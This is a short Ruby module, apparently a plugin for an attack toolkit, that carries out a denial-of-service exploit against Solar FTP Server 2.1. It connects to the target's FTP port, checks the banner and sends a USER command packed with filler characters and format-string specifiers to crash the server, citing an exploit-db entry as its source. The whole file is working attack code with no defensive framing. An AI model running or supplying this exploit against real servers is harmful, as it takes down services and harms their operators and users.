
def solarftp_dos_load(opt)
	opt["host"] = true
	opt["defport"] = 21
	return opt
end

def solarftp_dos(opt)
	# FTP Server 2.1 DoS
#http://www.exploit-db.com/exploits/16204/
	buff = "A"*50 + "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"
	host = opt["host"]
	port = opt["defport"]

	puts "#{HC}#{FYEL}Connecting to the target ..."
	begin
		s = TCPSocket.new(host, port)
	rescue
		puts "Failed connection....."
		return 0
	end
	puts "Connected.....! waiting for FTP  ..."
	data = s.recv(1000)
	if data.include?("Solar FTP") == true
		puts "#{HC}#{FYEL}Sending exploit ..."
		s.write("USER " + buff + "\r\n")
		puts "Exploit sent......"
	else
		puts "#{HC}#{FYEL}Target isn't vulnerable, Failed....."
	end
	s.close()
end

